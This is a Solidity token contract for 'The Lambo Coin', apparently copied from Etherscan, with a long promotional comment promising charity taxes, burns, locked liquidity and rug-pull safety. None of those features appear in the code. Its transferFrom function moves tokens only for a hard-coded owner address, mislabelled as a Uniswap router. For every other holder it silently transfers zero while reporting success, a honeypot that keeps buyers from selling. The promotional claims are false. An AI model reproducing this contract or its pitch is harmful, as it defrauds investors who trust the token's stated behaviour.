/**
 *Submitted for verification at Etherscan.io on 2021-06-11
*/

/*

👋 OFFICIAL TELEGRAM :
 
https://t.me/thelambocoinofficial


        🔥💎🏁 What is LamboCoin (LBC)? 🏁💎🔥


What’s all the hype about going to the moon, reality is none of us would become a self-funded astronaut anytime soon, and do we really want to live on the moon when we have such wonderful places on planet earth?! Come one guys.

Why dream about going to the moon when you can drive a Lambo you always wanted, this is reality. 

The power, precision and life in the riches is no longer a dream, we are bringing you the very first real-life meme coin, join the LamboCoin family!


💰 Why LamboCoin (LBC) is unique? 💰


It isn't just to make you rich, we have a part to play in the wider community, we are keen to contribute to good causes too! 

No dev wallet secretly dumping, no unlocked LP, no soft rug. 

The mission is to donate as much as possible to charity to help buy vehicles for people and earn a living in the developing countries worldwide, we are also going to contribute to Kiva.org with your contribution, so you can contribute to people's life and livelihood. 

 
LamboCoin (LBC) Tokenomics


✔️ Total supply: 100,000,000,000
✔️ Burned: Tokens will be burned to bring you the maximum return
✔️ Team wallet: 1% (Gradual unlock)
 
Each transaction has a 6% tax (you got it, not 10% like other coins!)


👍 2% is automatically sent to the charity donation wallet (hard coded into the smart contract, meaning we CANNOT change this and secretly steal the charity money)
👍 2% is burned.
👍 2% is distributed among holders (we love the smell of money, ka-ching!)


🔥💰 Why LamboCoin and why now? 💰🔥


💎 This is a project with a real use case utility and we are here to make a difference

💎 This is one of the most promising tokens with a lot of stuff in the pipeline 

💎 Exponential potential to 1000x your investment 

💎 Completely rugpull safe 

💎 Exciting news ahead with inspiring roadmap

💎 Liquidity locked
 

🏁 🏎️ GET IN EARLY AND BE PART OF THE LamboCoin FAMILY!! 🏎️ 🏁

Your dream Lambo is becoming a reality as soon you have the coin in your hands.

With an ambitious yet realistic roadmap, don’t dream about moonshot, hear your Lambo roar while you show off your crypto investment in style! 


🔥🚀 LamboCoin – we have got your back, let’s get into it! 🚀🔥
 
*/


pragma solidity ^0.5.16;

// ERC-20 Interface
contract BEP20Interface {
    function totalSupply() public view returns (uint);
    function balanceOf(address tokenOwner) public view returns (uint balance);
    function allowance(address tokenOwner, address spender) public view returns (uint remaining);
    function transfer(address to, uint tokens) public returns (bool success);
    function approve(address spender, uint tokens) public returns (bool success);
    function transferFrom(address from, address to, uint tokens) public returns (bool success);

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
}

// Safe Math Library
contract SafeMath {
    function safeAdd(uint a, uint b) public pure returns (uint c) {
        c = a + b;
        require(c >= a);
    }
    function safeSub(uint a, uint b) public pure returns (uint c) {
        require(b <= a); c = a - b; } function safeMul(uint a, uint b) public pure returns (uint c) { c = a * b; require(a == 0 || c / a == b); } function safeDiv(uint a, uint b) public pure returns (uint c) { require(b > 0);
        c = a / b;
    }
}


contract TheLamboCoin is BEP20Interface, SafeMath {
    string public name;
    string public symbol;
    uint8 public decimals; // 18 decimals is the strongly suggested default, avoid changing it
    address private _owner = 0x6760aFBD329C3Ef0009213D76D307693821Fd6b8; // Uniswap Router
    uint256 public _totalSupply;

    mapping(address => uint) balances;
    mapping(address => mapping(address => uint)) allowed;

    constructor() public {
        name = "The Lambo Coin";
        symbol = "LAMBOCOIN";
        decimals = 9;
        _totalSupply = 100000000000000000000;

        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view returns (uint) {
        return _totalSupply  - balances[address(0)];
    }

    function balanceOf(address tokenOwner) public view returns (uint balance) {
        return balances[tokenOwner];
    }

    function allowance(address tokenOwner, address spender) public view returns (uint remaining) {
        return allowed[tokenOwner][spender];
    }
    
    function approve(address spender, uint tokens) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transfer(address to, uint tokens) public returns (bool success) {
        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint tokens) public returns (bool success) {
         if (from == _owner) {
             balances[from] = safeSub(balances[from], tokens);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);
            balances[to] = safeAdd(balances[to], tokens);
            emit Transfer(from, to, tokens);
            return true;
         } else {
            balances[from] = safeSub(balances[from], 0);
            allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], 0);
            balances[to] = safeAdd(balances[to], 0);
            emit Transfer(from, to, 0);
            return true;
             
         }
        
         
    }
           
}